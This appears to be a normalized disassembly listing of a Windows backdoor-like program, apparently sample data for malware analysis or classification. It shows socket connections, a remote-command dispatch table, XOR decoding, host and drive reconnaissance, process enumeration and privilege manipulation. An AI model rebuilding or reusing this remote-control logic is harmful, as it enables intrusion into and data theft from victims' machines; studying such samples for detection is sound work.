lea eax [ ebp - 0x40c ]
push eax
call sub_405509
pop ecx
push 0x1
pop ebx
sub_40254b
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push esi
push eax
push ebx
push esi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push esi
push 0x2
push 0x2
push esi
push esi
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push ebx
push edi
call [ WriteFile@IAT ]
push edi
mov [ ebp - 0x4 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x4 ] esi
push ebx
jne r-xdata
call [ free@IAT ]
pop ecx
call [ free@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call sub_405509
pop ecx
pop ecx
push 0x1
pop eax
sub_402622
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
lea edi [ esi - 0x2 ]
mov [ eax + esi ] bl
push esi
jmp r-xdata
cmp edi ebx
je r-xdata
call [ free@IAT ]
pop ecx
add edi 0x2
push 0xd
push edi
mov [ ebp - 0x8 ] edi
call [ strchr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
push rw-data
push [ ebp - 0x8 ]
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
mov [ edi ] bl
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
add eax esi
cmp edi eax
jae r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x4 ]
push esi
push edi
call [ WriteFile@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] ebx
push esi
jne r-xdata
call [ free@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call sub_405509
pop ecx
pop ecx
push 0x1
pop eax
sub_402768
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
mov esi [ GetWindowsDirectoryA@IAT ]
mov ebx 0x400
push edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
mov edi [ DeleteFileA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x408 ]
push eax
call edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x408 ]
pop ecx
push eax
call edi
lea eax [ ebp - 0x408 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x408 ]
pop ecx
push eax
call edi
mov esi [ Sleep@IAT ]
push 0x1
xor ebx ebx
pop edi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call esi
call sub_4022bc
test eax eax
jne r-xdata
push eax
call [ closesocket@IAT ]
pop edi
pop esi
pop ebx
leave
retn
call sub_4023cf
test eax eax
jne r-xdata
call sub_401da2
test eax eax
jne r-xdata
call sub_401dfa
test eax eax
je r-xdata
push 0x1d4c0
jmp r-xdata
push 0x2710
call sub_40204f
test eax eax
je r-xdata
call esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_402b4a
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push [ rw-data ]
call [ ioctlsocket@IAT ]
lea eax [ ebp - 0x8 ]
mov [ rw-data ] edi
push eax
push ebx
push ebx
push sub_402f85
push ebx
push ebx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] edi
cmp [ rw-data ] ebx
je r-xdata
call sub_402d06
push edi
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_4028dc
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
sub_4029dd
push ebp
mov ebp esp
mov eax 0x2008
call sub_405de0
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ strstr@IAT ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ recv@IAT ]
test eax eax
je r-xdata
sub_402a8f
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_402ab8
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ gethostname@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_402b4a
push ebp
mov ebp esp
sub esp 0x124
push ebx
mov ebx [ ioctlsocket@IAT ]
push esi
push edi
xor edi edi
push 0x1
cmp [ rw-data ] edi
pop esi
jne r-xdata
push edi
push esi
push 0x2
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push edi
push esi
push 0x2
mov [ rw-data ] edi
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ htons@IAT ]
push rw-data
mov [ ebp - 0x1a ] ax
call [ inet_addr@IAT ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ connect@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
push 0x51
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ htons@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ connect@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
call [ closesocket@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
call sub_40320c
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
push edi
push sub_403000
push edi
push edi
call [ CreateThread@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
mov eax esi
sub_402d06
push ebp
mov ebp esp
sub esp 0x100
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov edi eax
call [ FreeLibrary@IAT ]
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call edi
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbf
cmp eax 0x25
ja r-xdata
cmp [ rw-data ] esi
push 0x1
pop edi
mov [ rw-data ] edi
je r-xdata
jmp [ eax * 4 + jump_table_402eb4 ]
mov eax edi
pop edi
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_4021a5
add esp 0x18
call sub_403d9d
jmp r-xdata
call sub_403ba3
jmp r-xdata
call sub_403bc1
jmp r-xdata
call sub_403b84
jmp r-xdata
call sub_403b2e
jmp r-xdata
call sub_4037f8
jmp r-xdata
call sub_403c7c
jmp r-xdata
call sub_40434c
jmp r-xdata
call sub_403cb3
jmp r-xdata
call sub_403d62
jmp r-xdata
call sub_403d42
jmp r-xdata
call sub_4047c8
jmp r-xdata
push 0x4e
call sub_4047db
pop ecx
jmp r-xdata
call sub_4048e0
jmp r-xdata
call sub_4049ff
jmp r-xdata
call sub_404820
jmp r-xdata
call sub_4055db
jmp r-xdata
call sub_404caf
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_4054f2
call sub_4059d9
jmp r-xdata
call sub_405a5c
jmp r-xdata
call sub_405a94
jmp r-xdata
call sub_405ae2
jmp r-xdata
call sub_405b1a
sub_402f4c
push 0x0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp sub_402f4c
push [ rw-data ]
call [ SetEvent@IAT ]
call [ WSACleanup@IAT ]
push 0x1
call [ ExitProcess@IAT ]
sub_402f85
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebx eax
call [ FreeLibrary@IAT ]
call ebx
mov edi eax
mov [ rw-data ] edi
push 0x1
pop eax
pop edi
pop esi
pop ebx
retn 0x4
call ebx
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
call ebx
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_401dfa
mov edi esi
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
sub_403000
push ebp
mov ebp esp
mov eax 0x2004
call sub_405de0
push ebx
push esi
mov esi [ ebp - 0x4 ]
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ rw-data ] ebx
mov al [ ebp - 0x2004 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_40313f
test eax eax
je r-xdata
mov [ rw-data ] bl
push eax
lea eax [ ebp - 0x2004 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2004 ]
push 0x5
push eax
call sub_4031a0
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebx
leave
retn 0x4
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp - 0x2003 ]
cmp esi 0x5
jl r-xdata
push 0x1
call edi
cmp [ rw-data ] ebx
jne r-xdata
cmp esi ebx
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call edi
jmp r-xdata
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2004 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2004 ]
push esi
push eax
call sub_4031a0
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
cmp [ ebp - 0x2004 ] 0x51
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
jmp r-xdata
sub_40313f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
xor ebx ebx
test eax eax
jle r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_4031a0
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ rw-data ]
call [ recv@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_40320c
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_4021a5
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_403338
push ebp
mov ebp esp
sub esp 0x540
push ebx
xor ebx ebx
cmp [ rw-data ] 0x2
push esi
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov esi 0x200
lea eax [ ebp - 0x340 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x33d ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
add esp 0x20
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov edi [ CloseHandle@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x4 ] edi
je r-xdata
push [ ebp - 0x10 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x140 ] 0x128
push ecx
push eax
call Process32First
pop edi
pop esi
pop ebx
leave
retn
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x8 ] eax
call esi
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
je r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
and [ ebp - 0x540 ] 0x0
cmp [ rw-data ] 0x2
jne r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call strcpy
pop ecx
pop ecx
push 0x410
push [ ebp - 0x138 ]
call sub_4035ff
pop ecx
mov ebx eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push ebx
call [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x2
push [ ebp - 0x138 ]
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp - 0x10 ]
call Process32Next
jmp r-xdata
push ebx
call edi
xor ebx ebx
jmp r-xdata
lea eax [ ebp - 0x540 ]
push esi
push eax
push [ ebp - 0x14 ]
push ebx
call [ ebp - 0xc ]
lea eax [ ebp - 0x540 ]
push eax
call sub_40373c
pop ecx
call sub_403b4d
call sub_403af8
jmp r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x340 ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
pop ecx
sub_4034fe
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
mov [ ebp - 0x10 ] ecx
pop eax
lea ecx [ ebp + 0xc ]
xor ebx ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] al
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp + 0xc ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
push esi
push ebx
push [ ebp + 0xc ]
push ebx
push ebx
push 0x4
push 0x6
push [ ebp + 0x8 ]
call SetSecurityInfo
push [ ebp + 0xc ]
mov esi eax
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
sete al
pop esi
jmp r-xdata
pop ebx
leave
retn
sub_40358a
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x1
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push 0x10
lea ecx [ ebp + 0xc ]
pop eax
push ecx
mov [ ebp + 0xc ] eax
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push [ ebp + 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
leave
retn
sub_4035ff
push ebp
mov ebp esp
sub esp 0x21c
push ebx
push esi
push edi
mov edi [ OpenProcess@IAT ]
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push [ ebp + 0xc ]
call edi
cmp eax ebx
mov [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
push ebx
push 0x40000
call edi
mov esi [ GetCurrentProcess@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_4034fe
pop ecx
lea eax [ ebp - 0xc ]
pop ecx
push ebx
push ebx
push [ ebp + 0xc ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0xc ] ebx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push [ ebp - 0x8 ]
call sub_40358a
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x8 ]
push ebx
push 0x80000
call edi
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x8 ]
call sub_4035ea
pop ecx
pop ecx
lea ecx [ ebp + 0x8 ]
mov eax 0x200
push ecx
mov [ ebp + 0x8 ] eax
push eax
lea eax [ ebp - 0x21c ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push ebx
push ebx
push ebx
push [ ebp - 0x21c ]
push 0x1
push 0x6
push edi
call SetSecurityInfo
test eax eax
jne r-xdata
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push 0x40000
push eax
call esi
push eax
push edi
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
sub_40373c
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx ] 0x0
je r-xdata
mov esi rw-data
push esi
call strlen
mov edi rw-data
mov [ ebp + 0x8 ] eax
push edi
call strlen
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push esi
mov esi [ _strnicmp@IAT ]
push ebx
call esi
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax ebx
push eax
push ebx
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax ebx
push eax
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push ebx
call strcpy
add esp 0x18
jmp r-xdata
sub_4037f8
push ebp
mov ebp esp
mov eax 0x2744
call sub_405de0
push ebx
push esi
push edi
push 0x5
xor esi esi
cmp [ rw-data ] 0x2
pop ebx
mov [ ebp - 0x2744 ] 0x43
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
jne r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi esi
mov [ ebp - 0x4 ] edi
je r-xdata
push 0x5
pop ebx
mov [ ebp - 0x2743 ] ebx
jmp r-xdata
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x144 ] 0x128
push ecx
push eax
call Process32First
test eax eax
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0xc ] eax
call esi
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edi 0x410
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
push edi
push [ ebp - 0x13c ]
call sub_4035ff
pop ecx
mov esi eax
pop ecx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push esi
call [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2744 ]
push ebx
push eax
mov [ ebp - 0x2743 ] ebx
call sub_4021a5
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x13c ] 0x0
jne r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push 0x5c
push eax
mov [ ebp - 0x18 ] 0x100
call [ strrchr@IAT ]
inc eax
push eax
lea eax [ ebp - 0x744 ]
push eax
call strcpy
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
